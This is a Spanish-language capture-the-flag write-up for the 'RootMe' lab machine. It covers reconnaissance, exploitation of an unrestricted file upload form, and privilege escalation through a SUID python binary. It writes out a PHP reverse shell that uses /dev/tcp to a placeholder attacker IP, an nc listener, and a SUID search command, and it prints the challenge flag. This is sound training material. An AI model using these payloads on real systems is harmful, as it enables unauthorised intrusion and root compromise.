# RootMe VM

## Reconocimiento

- Se realizo en escaneo tcp para identificar servicios activos

nmap -sT -sV --top-ports 50 -n <ip-victima>

Se identificaron los servicios http y ssh corriendo por los puertos 80 y 22 

- Se realizo un escaneo del sitio web utilizando fuzzing

dirb http://<ip-victima>

Se identificaron los directorios 

/panel/ - el mismo contiene un panel desde el cual se le pueden subir ficheros al sitio
/uploads/ - el cual contiene los ficheros que se hayan subido al propio sitio

Se analizo el codigo de ambos sitios

/panel/ - no existe ninguna validacion de lado del cliente en el codigo del html

- En la misma existe un formulario el cual nos permite subir ficheros al sitio sin las validaciones necesarios

## Explotacion

1 - Creamos el fichero malicioso en php para poder subirlo al sitio

Decidimos crear nuestro propio exploit para lograr acceder al sistema

	- Creacion del fichero 
	
		touch <fichero>.php

	- Desarrollo del exploit

	Se inicializo el codigo en php mediante <?php ?>, luego comence a estudiar como desarrollar el exploit

		- Elemento 1 - Entender que queremos hacer 
		
		Queremos subir un fichero que al ejecutarlo establesca conexion con nuestra pc y nos levante una shell en la victima

	Para realizar eso existen varias maneras:

	- Forma 1: Utilizando la funcion fsockopen() y proc_open() la cual nos permite conectarnos desde la pc victima y funcionaria de la siguiente manera
		- fsockopen("<IP-atacante>,puerto") -- Recordar que lo que estamos disenando es una reverse shell
		- proc_open(/bin/sh -i) -- La cual nos iniciaria una shell interactiva

	- Forma 2: Utilizando la funcion system()
		- system ("bash -i 'bash -c >& /dev/tcp/<ip-atacante>/<puerto-atacante> 0>&1'") -- Estamos iniciando una shell interactiba 
		la cual redirige la salida y entrada a la conexion tcp
		- Traduccion: Lo que escribo y la respuesta va a la conexion tcp
 

2 - Disenamos el codigo del malware o reverse shell

<?php
	system("bash -c 'bash -i >& /dev/tcp/ip-atacante/puerto 0>&1'");
?>

3 - Abrimos conexion en nuestro PC

nc -lnvp <puerto>

## Escalada de privilegios

4 - Una vez conectado investigamos sobre que usuario estamos corriendo y los permisos del mismo

whoami 
sudo -l

5 - Buscamos binarios con permisos de SUID es decir que ejecutan tareas como root

find / -perm -4000 2>/dev/null

5 - Logramos identificar python 2.7 con permisos SUID

6 - Buscamos en http://gtfobins.org como explotar ese binario para hacernos root

7 - Explotamos el binario nos hacemos root y buscamos la ultima flag

THM{pr1v1l3g3_3sc4l4t10n}

## Notas

shell_exec - Se queda colgado en ocaciones
proc_open - Igual puede dar problemas
fsockopen - establece la conexion correctamente pero no abre la shell
 
## Vulnerabilidades

Subida de fichero no restringida - La misma posibilita la subida de ficheros desde un formulario de la web sin la debida 
validacion.

Ejecucion de codigo remoto - Consiste en la ejecucion de codigos propios en el PC de la victima desde la pc del atacante.

Escalada de privilegios mediante permisos SUID - Consiste en utilizar aplicaciones que se ejecutan como root con el fin de 
lograr una shell root o ejecutar comandos como root

